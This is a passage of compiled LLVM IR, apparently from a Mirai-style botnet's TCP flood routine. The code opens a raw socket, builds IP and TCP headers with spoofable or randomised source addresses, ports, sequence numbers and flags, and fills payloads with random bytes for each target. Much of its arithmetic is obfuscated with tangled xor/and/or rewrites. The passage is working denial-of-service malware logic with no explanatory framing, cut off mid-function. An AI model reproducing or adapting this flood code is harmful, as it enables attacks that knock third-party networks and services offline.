  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca i8, align 1
  %28 = alloca i32, align 4
  %29 = alloca %struct.iphdr*, align 8
  %30 = alloca %struct.tcphdr*, align 8
  %31 = alloca i8*, align 8
  %32 = alloca i8*, align 8
  %33 = alloca %struct.iphdr*, align 8
  %34 = alloca %struct.tcphdr*, align 8
  %35 = alloca i8*, align 8
  %36 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %37 = load i8, i8* %5, align 1
  %38 = zext i8 %37 to i64
  %39 = call noalias i8* @calloc(i64 %38, i64 8) #7
  %40 = bitcast i8* %39 to i8**
  store i8** %40, i8*** %11, align 8
  %41 = load i8, i8* %7, align 1
  %42 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %43 = call i32 @attack_get_opt_int(i8 zeroext %41, %struct.attack_option* %42, i8 zeroext 2, i32 0)
  %44 = trunc i32 %43 to i8
  store i8 %44, i8* %12, align 1
  %45 = load i8, i8* %7, align 1
  %46 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %47 = call i32 @attack_get_opt_int(i8 zeroext %45, %struct.attack_option* %46, i8 zeroext 3, i32 65535)
  %48 = trunc i32 %47 to i16
  store i16 %48, i16* %13, align 2
  %49 = load i8, i8* %7, align 1
  %50 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %51 = call i32 @attack_get_opt_int(i8 zeroext %49, %struct.attack_option* %50, i8 zeroext 4, i32 64)
  %52 = trunc i32 %51 to i8
  store i8 %52, i8* %14, align 1
  %53 = load i8, i8* %7, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %55 = call i32 @attack_get_opt_int(i8 zeroext %53, %struct.attack_option* %54, i8 zeroext 5, i32 0)
  %56 = trunc i32 %55 to i8
  store i8 %56, i8* %15, align 1
  %57 = load i8, i8* %7, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %59 = call i32 @attack_get_opt_int(i8 zeroext %57, %struct.attack_option* %58, i8 zeroext 6, i32 65535)
  %60 = trunc i32 %59 to i16
  store i16 %60, i16* %16, align 2
  %61 = load i8, i8* %7, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %63 = call i32 @attack_get_opt_int(i8 zeroext %61, %struct.attack_option* %62, i8 zeroext 7, i32 65535)
  %64 = trunc i32 %63 to i16
  store i16 %64, i16* %17, align 2
  %65 = load i8, i8* %7, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 17, i32 65535)
  store i32 %67, i32* %18, align 4
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 18, i32 65535)
  store i32 %70, i32* %19, align 4
  %71 = load i8, i8* %7, align 1
  %72 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %73 = call i32 @attack_get_opt_int(i8 zeroext %71, %struct.attack_option* %72, i8 zeroext 11, i32 0)
  %74 = trunc i32 %73 to i8
  store i8 %74, i8* %20, align 1
  %75 = load i8, i8* %7, align 1
  %76 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %77 = call i32 @attack_get_opt_int(i8 zeroext %75, %struct.attack_option* %76, i8 zeroext 12, i32 1)
  %78 = trunc i32 %77 to i8
  store i8 %78, i8* %21, align 1
  %79 = load i8, i8* %7, align 1
  %80 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %81 = call i32 @attack_get_opt_int(i8 zeroext %79, %struct.attack_option* %80, i8 zeroext 13, i32 0)
  %82 = trunc i32 %81 to i8
  store i8 %82, i8* %22, align 1
  %83 = load i8, i8* %7, align 1
  %84 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %85 = call i32 @attack_get_opt_int(i8 zeroext %83, %struct.attack_option* %84, i8 zeroext 14, i32 0)
  %86 = trunc i32 %85 to i8
  store i8 %86, i8* %23, align 1
  %87 = load i8, i8* %7, align 1
  %88 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %89 = call i32 @attack_get_opt_int(i8 zeroext %87, %struct.attack_option* %88, i8 zeroext 15, i32 0)
  %90 = trunc i32 %89 to i8
  store i8 %90, i8* %24, align 1
  %91 = load i8, i8* %7, align 1
  %92 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %93 = call i32 @attack_get_opt_int(i8 zeroext %91, %struct.attack_option* %92, i8 zeroext 16, i32 0)
  %94 = trunc i32 %93 to i8
  store i8 %94, i8* %25, align 1
  %95 = load i8, i8* %7, align 1
  %96 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %97 = call i32 @attack_get_opt_int(i8 zeroext %95, %struct.attack_option* %96, i8 zeroext 0, i32 512)
  store i32 %97, i32* %26, align 4
  %98 = load i8, i8* %7, align 1
  %99 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %100 = call i32 @attack_get_opt_int(i8 zeroext %98, %struct.attack_option* %99, i8 zeroext 1, i32 1)
  %101 = trunc i32 %100 to i8
  store i8 %101, i8* %27, align 1
  %102 = load i8, i8* %7, align 1
  %103 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %104 = load i32, i32* @LOCAL_ADDR, align 4
  %105 = call i32 @attack_get_opt_ip(i8 zeroext %102, %struct.attack_option* %103, i8 zeroext 25, i32 %104)
  store i32 %105, i32* %28, align 4
  %106 = call i32 @socket(i32 2, i32 3, i32 6) #7
  store i32 %106, i32* %10, align 4
  %107 = icmp eq i32 %106, -1
  br i1 %107, label %108, label %109

; <label>:108:                                    ; preds = %4
  br label %644

; <label>:109:                                    ; preds = %4
  store i32 1, i32* %9, align 4
  %110 = load i32, i32* %10, align 4
  %111 = bitcast i32* %9 to i8*
  %112 = call i32 @setsockopt(i32 %110, i32 0, i32 3, i8* %111, i32 4) #7
  %113 = icmp eq i32 %112, -1
  br i1 %113, label %114, label %117

; <label>:114:                                    ; preds = %109
  %115 = load i32, i32* %10, align 4
  %116 = call i32 @close(i32 %115)
  br label %644

; <label>:117:                                    ; preds = %109
  store i32 0, i32* %9, align 4
  br label %118

; <label>:118:                                    ; preds = %438, %117
  %119 = load i32, i32* %9, align 4
  %120 = load i8, i8* %5, align 1
  %121 = zext i8 %120 to i32
  %122 = icmp slt i32 %119, %121
  br i1 %122, label %123, label %445

; <label>:123:                                    ; preds = %118
  %124 = call noalias i8* @calloc(i64 1510, i64 1) #7
  %125 = load i8**, i8*** %11, align 8
  %126 = load i32, i32* %9, align 4
  %127 = sext i32 %126 to i64
  %128 = getelementptr inbounds i8*, i8** %125, i64 %127
  store i8* %124, i8** %128, align 8
  %129 = load i8**, i8*** %11, align 8
  %130 = load i32, i32* %9, align 4
  %131 = sext i32 %130 to i64
  %132 = getelementptr inbounds i8*, i8** %129, i64 %131
  %133 = load i8*, i8** %132, align 8
  %134 = bitcast i8* %133 to %struct.iphdr*
  store %struct.iphdr* %134, %struct.iphdr** %29, align 8
  %135 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %136 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %135, i64 1
  %137 = bitcast %struct.iphdr* %136 to %struct.tcphdr*
  store %struct.tcphdr* %137, %struct.tcphdr** %30, align 8
  %138 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %139 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %138, i64 1
  %140 = bitcast %struct.tcphdr* %139 to i8*
  store i8* %140, i8** %31, align 8
  %141 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %142 = bitcast %struct.iphdr* %141 to i8*
  %143 = load i8, i8* %142, align 4
  %144 = xor i8 15, -1
  %145 = xor i8 %143, %144
  %146 = and i8 %145, %143
  %147 = and i8 %143, 15
  %148 = and i8 %146, 64
  %149 = xor i8 %146, 64
  %150 = or i8 %148, %149
  %151 = or i8 %146, 64
  store i8 %150, i8* %142, align 4
  %152 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %153 = bitcast %struct.iphdr* %152 to i8*
  %154 = load i8, i8* %153, align 4
  %155 = xor i8 %154, -1
  %156 = xor i8 -16, -1
  %157 = xor i8 -5, -1
  %158 = or i8 %155, %156
  %159 = or i8 -5, %157
  %160 = xor i8 %158, -1
  %161 = and i8 %160, %159
  %162 = and i8 %154, -16
  %163 = xor i8 %161, -1
  %164 = xor i8 5, -1
  %165 = xor i8 -70, -1
  %166 = and i8 %163, -70
  %167 = and i8 %161, %165
  %168 = and i8 %164, -70
  %169 = and i8 5, %165
  %170 = or i8 %166, %167
  %171 = or i8 %168, %169
  %172 = xor i8 %170, %171
  %173 = or i8 %163, %164
  %174 = xor i8 %173, -1
  %175 = or i8 -70, %165
  %176 = and i8 %174, %175
  %177 = or i8 %172, %176
  %178 = or i8 %161, 5
  store i8 %177, i8* %153, align 4
  %179 = load i8, i8* %12, align 1
  %180 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %181 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %180, i32 0, i32 1
  store i8 %179, i8* %181, align 1
  %182 = load i32, i32* %26, align 4
  %183 = sext i32 %182 to i64
  %184 = sub i64 0, 40
  %185 = sub i64 0, %183
  %186 = add i64 %184, %185
  %187 = sub i64 0, %186
  %188 = add i64 40, %183
  %189 = trunc i64 %187 to i16
  %190 = call zeroext i16 @htons(i16 zeroext %189) #8
  %191 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %192 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %191, i32 0, i32 2
  store i16 %190, i16* %192, align 2
  %193 = load i16, i16* %13, align 2
  %194 = call zeroext i16 @htons(i16 zeroext %193) #8
  %195 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %196 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %195, i32 0, i32 3
  store i16 %194, i16* %196, align 4
  %197 = load i8, i8* %14, align 1
  %198 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %199 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %198, i32 0, i32 5
  store i8 %197, i8* %199, align 4
  %200 = load i8, i8* %15, align 1
  %201 = icmp ne i8 %200, 0
  br i1 %201, label %202, label %206

; <label>:202:                                    ; preds = %123
  %203 = call zeroext i16 @htons(i16 zeroext 16384) #8
  %204 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %205 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %204, i32 0, i32 4
  store i16 %203, i16* %205, align 2
  br label %206

; <label>:206:                                    ; preds = %202, %123
  %207 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %208 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %207, i32 0, i32 6
  store i8 6, i8* %208, align 1
  %209 = load i32, i32* %28, align 4
  %210 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %211 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %210, i32 0, i32 8
  store i32 %209, i32* %211, align 4
  %212 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %213 = load i32, i32* %9, align 4
  %214 = sext i32 %213 to i64
  %215 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %212, i64 %214
  %216 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %215, i32 0, i32 1
  %217 = load i32, i32* %216, align 4
  %218 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %219 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %218, i32 0, i32 9
  store i32 %217, i32* %219, align 4
  %220 = load i16, i16* %16, align 2
  %221 = call zeroext i16 @htons(i16 zeroext %220) #8
  %222 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %223 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %222, i32 0, i32 0
  store i16 %221, i16* %223, align 4
  %224 = load i16, i16* %17, align 2
  %225 = call zeroext i16 @htons(i16 zeroext %224) #8
  %226 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %227 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %226, i32 0, i32 1
  store i16 %225, i16* %227, align 2
  %228 = load i32, i32* %18, align 4
  %229 = trunc i32 %228 to i16
  %230 = call zeroext i16 @htons(i16 zeroext %229) #8
  %231 = zext i16 %230 to i32
  %232 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %233 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %232, i32 0, i32 2
  store i32 %231, i32* %233, align 4
  %234 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %235 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %234, i32 0, i32 4
  %236 = load i16, i16* %235, align 4
  %237 = xor i16 -241, -1
  %238 = xor i16 %236, %237
  %239 = and i16 %238, %236
  %240 = and i16 %236, -241
  %241 = xor i16 %239, -1
  %242 = xor i16 80, -1
  %243 = xor i16 -32502, -1
  %244 = and i16 %241, -32502
  %245 = and i16 %239, %243
  %246 = and i16 %242, -32502
  %247 = and i16 80, %243
  %248 = or i16 %244, %245
  %249 = or i16 %246, %247
  %250 = xor i16 %248, %249
  %251 = or i16 %241, %242
  %252 = xor i16 %251, -1
  %253 = or i16 -32502, %243
  %254 = and i16 %252, %253
  %255 = or i16 %250, %254
  %256 = or i16 %239, 80
  store i16 %255, i16* %235, align 4
  %257 = load i8, i8* %20, align 1
  %258 = sext i8 %257 to i16
  %259 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %260 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %259, i32 0, i32 4
  %261 = load i16, i16* %260, align 4
  %262 = xor i16 1, -1
  %263 = xor i16 %258, %262
  %264 = and i16 %263, %258
  %265 = and i16 %258, 1
  %266 = shl i16 %264, 13
  %267 = xor i16 -8193, -1
  %268 = xor i16 %261, %267
  %269 = and i16 %268, %261
  %270 = and i16 %261, -8193
  %271 = and i16 %269, %266
  %272 = xor i16 %269, %266
  %273 = or i16 %271, %272
  %274 = or i16 %269, %266
  store i16 %273, i16* %260, align 4
  %275 = load i8, i8* %21, align 1
  %276 = sext i8 %275 to i16
  %277 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %278 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %277, i32 0, i32 4
  %279 = load i16, i16* %278, align 4
  %280 = xor i16 1, -1
  %281 = xor i16 %276, %280
  %282 = and i16 %281, %276
  %283 = and i16 %276, 1
  %284 = shl i16 %282, 12
  %285 = xor i16 %279, -1
  %286 = xor i16 -4097, -1
  %287 = xor i16 20977, -1
  %288 = or i16 %285, %286
  %289 = or i16 20977, %287
  %290 = xor i16 %288, -1
  %291 = and i16 %290, %289
  %292 = and i16 %279, -4097
  %293 = xor i16 %291, -1
  %294 = xor i16 %284, -1
  %295 = xor i16 11322, -1
  %296 = and i16 %293, 11322
  %297 = and i16 %291, %295
  %298 = and i16 %294, 11322
  %299 = and i16 %284, %295
  %300 = or i16 %296, %297
  %301 = or i16 %298, %299
  %302 = xor i16 %300, %301
  %303 = or i16 %293, %294
  %304 = xor i16 %303, -1
  %305 = or i16 11322, %295
  %306 = and i16 %304, %305
  %307 = or i16 %302, %306
  %308 = or i16 %291, %284
  store i16 %307, i16* %278, align 4
  %309 = load i8, i8* %22, align 1
  %310 = sext i8 %309 to i16
  %311 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %312 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %311, i32 0, i32 4
  %313 = load i16, i16* %312, align 4
  %314 = xor i16 1, -1
  %315 = xor i16 %310, %314
  %316 = and i16 %315, %310
  %317 = and i16 %310, 1
  %318 = shl i16 %316, 11
  %319 = xor i16 %313, -1
  %320 = xor i16 -2049, -1
  %321 = xor i16 -18429, -1
  %322 = or i16 %319, %320
  %323 = or i16 -18429, %321
  %324 = xor i16 %322, -1
  %325 = and i16 %324, %323
  %326 = and i16 %313, -2049
  %327 = and i16 %325, %318
  %328 = xor i16 %325, %318
  %329 = or i16 %327, %328
  %330 = or i16 %325, %318
  store i16 %329, i16* %312, align 4
  %331 = load i8, i8* %23, align 1
  %332 = sext i8 %331 to i16
  %333 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %334 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %333, i32 0, i32 4
  %335 = load i16, i16* %334, align 4
  %336 = xor i16 1, -1
  %337 = xor i16 %332, %336
  %338 = and i16 %337, %332
  %339 = and i16 %332, 1
  %340 = shl i16 %338, 10
  %341 = xor i16 -1025, -1
  %342 = xor i16 %335, %341
  %343 = and i16 %342, %335
  %344 = and i16 %335, -1025
  %345 = and i16 %343, %340
  %346 = xor i16 %343, %340
  %347 = or i16 %345, %346
  %348 = or i16 %343, %340
  store i16 %347, i16* %334, align 4
  %349 = load i8, i8* %24, align 1
  %350 = sext i8 %349 to i16
  %351 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %352 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %351, i32 0, i32 4
  %353 = load i16, i16* %352, align 4
  %354 = xor i16 %350, -1
  %355 = xor i16 1, -1
  %356 = xor i16 22095, -1
  %357 = or i16 %354, %355
  %358 = or i16 22095, %356
  %359 = xor i16 %357, -1
  %360 = and i16 %359, %358
  %361 = and i16 %350, 1
  %362 = shl i16 %360, 9
  %363 = xor i16 %353, -1
  %364 = xor i16 -513, -1
  %365 = xor i16 -3687, -1
  %366 = or i16 %363, %364
  %367 = or i16 -3687, %365
  %368 = xor i16 %366, -1
  %369 = and i16 %368, %367
  %370 = and i16 %353, -513
  %371 = xor i16 %369, -1
  %372 = xor i16 %362, -1
  %373 = xor i16 -11018, -1
  %374 = and i16 %371, -11018
  %375 = and i16 %369, %373
  %376 = and i16 %372, -11018
  %377 = and i16 %362, %373
  %378 = or i16 %374, %375
  %379 = or i16 %376, %377
  %380 = xor i16 %378, %379
  %381 = or i16 %371, %372
  %382 = xor i16 %381, -1
  %383 = or i16 -11018, %373
  %384 = and i16 %382, %383
  %385 = or i16 %380, %384
  %386 = or i16 %369, %362
  store i16 %385, i16* %352, align 4
  %387 = load i8, i8* %25, align 1
  %388 = sext i8 %387 to i16
  %389 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %390 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %389, i32 0, i32 4
  %391 = load i16, i16* %390, align 4
  %392 = xor i16 1, -1
  %393 = xor i16 %388, %392
  %394 = and i16 %393, %388
  %395 = and i16 %388, 1
  %396 = shl i16 %394, 8
  %397 = xor i16 %391, -1
  %398 = xor i16 -257, -1
  %399 = xor i16 -2353, -1
  %400 = or i16 %397, %398
  %401 = or i16 -2353, %399
  %402 = xor i16 %400, -1
  %403 = and i16 %402, %401
  %404 = and i16 %391, -257
  %405 = and i16 %403, %396
  %406 = xor i16 %403, %396
  %407 = or i16 %405, %406
  %408 = or i16 %403, %396
  store i16 %407, i16* %390, align 4
  %409 = call i32 @rand_next()
  %410 = xor i32 %409, -1
  %411 = xor i32 65535, -1
  %412 = xor i32 200807470, -1
  %413 = or i32 %410, %411
  %414 = or i32 200807470, %412
  %415 = xor i32 %413, -1
  %416 = and i32 %415, %414
  %417 = and i32 %409, 65535
  %418 = trunc i32 %416 to i16
  %419 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %420 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %419, i32 0, i32 5
  store i16 %418, i16* %420, align 2
  %421 = load i8, i8* %22, align 1
  %422 = icmp ne i8 %421, 0
  br i1 %422, label %423, label %435

; <label>:423:                                    ; preds = %206
  %424 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %425 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %424, i32 0, i32 4
  %426 = load i16, i16* %425, align 4
  %427 = xor i16 -2049, -1
  %428 = xor i16 %426, %427
  %429 = and i16 %428, %426
  %430 = and i16 %426, -2049
  %431 = and i16 %429, 2048
  %432 = xor i16 %429, 2048
  %433 = or i16 %431, %432
  %434 = or i16 %429, 2048
  store i16 %433, i16* %425, align 4
  br label %435

; <label>:435:                                    ; preds = %423, %206
  %436 = load i8*, i8** %31, align 8
  %437 = load i32, i32* %26, align 4
  call void @rand_str(i8* %436, i32 %437)
  br label %438

; <label>:438:                                    ; preds = %435
  %439 = load i32, i32* %9, align 4
  %440 = sub i32 0, %439
  %441 = sub i32 0, 1
  %442 = add i32 %440, %441
  %443 = sub i32 0, %442
  %444 = add nsw i32 %439, 1
  store i32 %443, i32* %9, align 4
  br label %118

; <label>:445:                                    ; preds = %118
  br label %446

; <label>:446:                                    ; preds = %643, %445
  store i32 0, i32* %9, align 4
  br label %447

; <label>:447:                                    ; preds = %636, %446
  %448 = load i32, i32* %9, align 4
  %449 = load i8, i8* %5, align 1
  %450 = zext i8 %449 to i32
  %451 = icmp slt i32 %448, %450
  br i1 %451, label %452, label %643

; <label>:452:                                    ; preds = %447
  %453 = load i8**, i8*** %11, align 8
  %454 = load i32, i32* %9, align 4
  %455 = sext i32 %454 to i64
  %456 = getelementptr inbounds i8*, i8** %453, i64 %455
  %457 = load i8*, i8** %456, align 8
  store i8* %457, i8** %32, align 8
  %458 = load i8*, i8** %32, align 8
  %459 = bitcast i8* %458 to %struct.iphdr*
  store %struct.iphdr* %459, %struct.iphdr** %33, align 8
  %460 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %461 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %460, i64 1
  %462 = bitcast %struct.iphdr* %461 to %struct.tcphdr*
  store %struct.tcphdr* %462, %struct.tcphdr** %34, align 8
  %463 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %464 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %463, i64 1
  %465 = bitcast %struct.tcphdr* %464 to i8*
  store i8* %465, i8** %35, align 8
  %466 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %467 = load i32, i32* %9, align 4
  %468 = sext i32 %467 to i64
  %469 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %466, i64 %468
  %470 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %469, i32 0, i32 2
  %471 = load i8, i8* %470, align 4
  %472 = zext i8 %471 to i32
  %473 = icmp slt i32 %472, 32
  br i1 %473, label %474, label %499

; <label>:474:                                    ; preds = %452
  %475 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %476 = load i32, i32* %9, align 4
  %477 = sext i32 %476 to i64
  %478 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %475, i64 %477
  %479 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %478, i32 0, i32 1
  %480 = load i32, i32* %479, align 4
  %481 = call i32 @ntohl(i32 %480) #8
  %482 = call i32 @rand_next()
  %483 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %484 = load i32, i32* %9, align 4
  %485 = sext i32 %484 to i64
  %486 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %483, i64 %485
  %487 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %486, i32 0, i32 2
  %488 = load i8, i8* %487, align 4
  %489 = zext i8 %488 to i32
  %490 = lshr i32 %482, %489
  %491 = sub i32 0, %481
  %492 = sub i32 0, %490
  %493 = add i32 %491, %492
  %494 = sub i32 0, %493
  %495 = add i32 %481, %490
  %496 = call i32 @htonl(i32 %494) #8
  %497 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %498 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %497, i32 0, i32 9
  store i32 %496, i32* %498, align 4
  br label %499

; <label>:499:                                    ; preds = %474, %452
  %500 = load i32, i32* %28, align 4
  %501 = icmp eq i32 %500, -1
  br i1 %501, label %502, label %506

; <label>:502:                                    ; preds = %499
  %503 = call i32 @rand_next()
  %504 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %505 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %504, i32 0, i32 8
  store i32 %503, i32* %505, align 4
  br label %506

; <label>:506:                                    ; preds = %502, %499
  %507 = load i16, i16* %13, align 2
  %508 = zext i16 %507 to i32
  %509 = icmp eq i32 %508, 65535
  br i1 %509, label %510, label %523

; <label>:510:                                    ; preds = %506
  %511 = call i32 @rand_next()
  %512 = xor i32 %511, -1
  %513 = xor i32 65535, -1
  %514 = xor i32 -724962333, -1
  %515 = or i32 %512, %513
  %516 = or i32 -724962333, %514
  %517 = xor i32 %515, -1
  %518 = and i32 %517, %516
  %519 = and i32 %511, 65535
  %520 = trunc i32 %518 to i16
  %521 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %522 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %521, i32 0, i32 3
  store i16 %520, i16* %522, align 4
  br label %523

; <label>:523:                                    ; preds = %510, %506
  %524 = load i16, i16* %16, align 2
  %525 = zext i16 %524 to i32
  %526 = icmp eq i32 %525, 65535
  br i1 %526, label %527, label %540

; <label>:527:                                    ; preds = %523
  %528 = call i32 @rand_next()
  %529 = xor i32 %528, -1
  %530 = xor i32 65535, -1
  %531 = xor i32 -1012635038, -1
  %532 = or i32 %529, %530
  %533 = or i32 -1012635038, %531
  %534 = xor i32 %532, -1
  %535 = and i32 %534, %533
  %536 = and i32 %528, 65535
  %537 = trunc i32 %535 to i16
  %538 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %539 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %538, i32 0, i32 0
  store i16 %537, i16* %539, align 4
  br label %540

; <label>:540:                                    ; preds = %527, %523
  %541 = load i16, i16* %17, align 2
  %542 = zext i16 %541 to i32
  %543 = icmp eq i32 %542, 65535
  br i1 %543, label %544, label %557

; <label>:544:                                    ; preds = %540
  %545 = call i32 @rand_next()
  %546 = xor i32 %545, -1
  %547 = xor i32 65535, -1
  %548 = xor i32 -887053112, -1
  %549 = or i32 %546, %547
  %550 = or i32 -887053112, %548
  %551 = xor i32 %549, -1
  %552 = and i32 %551, %550
  %553 = and i32 %545, 65535
  %554 = trunc i32 %552 to i16
  %555 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %556 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %555, i32 0, i32 1
  store i16 %554, i16* %556, align 2
  br label %557

; <label>:557:                                    ; preds = %544, %540
  %558 = load i32, i32* %18, align 4
  %559 = icmp eq i32 %558, 65535
  br i1 %559, label %560, label %564

; <label>:560:                                    ; preds = %557
  %561 = call i32 @rand_next()
  %562 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %563 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %562, i32 0, i32 2
  store i32 %561, i32* %563, align 4
  br label %564

; <label>:564:                                    ; preds = %560, %557
  %565 = load i32, i32* %19, align 4
  %566 = icmp eq i32 %565, 65535
  br i1 %566, label %567, label %571

; <label>:567:                                    ; preds = %564
  %568 = call i32 @rand_next()
  %569 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %570 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %569, i32 0, i32 3
  store i32 %568, i32* %570, align 4
  br label %571

; <label>:571:                                    ; preds = %567, %564
  %572 = load i8, i8* %27, align 1
  %573 = icmp ne i8 %572, 0
  br i1 %573, label %574, label %577

; <label>:574:                                    ; preds = %571
  %575 = load i8*, i8** %35, align 8
  %576 = load i32, i32* %26, align 4
  call void @rand_str(i8* %575, i32 %576)
  br label %577

; <label>:577:                                    ; preds = %574, %571
  %578 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %579 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %578, i32 0, i32 7
  store i16 0, i16* %579, align 2
  %580 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %581 = bitcast %struct.iphdr* %580 to i16*
  %582 = call zeroext i16 @checksum_generic(i16* %581, i32 20)
  %583 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %584 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %583, i32 0, i32 7
  store i16 %582, i16* %584, align 2
  %585 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %586 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %585, i32 0, i32 6
  store i16 0, i16* %586, align 4
  %587 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %588 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %589 = bitcast %struct.tcphdr* %588 to i8*
  %590 = load i32, i32* %26, align 4
  %591 = sext i32 %590 to i64
  %592 = sub i64 0, 20
  %593 = sub i64 0, %591
  %594 = add i64 %592, %593
  %595 = sub i64 0, %594
  %596 = add i64 20, %591
  %597 = trunc i64 %595 to i16
  %598 = call zeroext i16 @htons(i16 zeroext %597) #8
  %599 = load i32, i32* %26, align 4
  %600 = sext i32 %599 to i64
  %601 = sub i64 0, %600
  %602 = sub i64 20, %601
  %603 = add i64 20, %600
  %604 = trunc i64 %602 to i32
  %605 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %587, i8* %589, i16 zeroext %598, i32 %604)
  %606 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %607 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %606, i32 0, i32 6
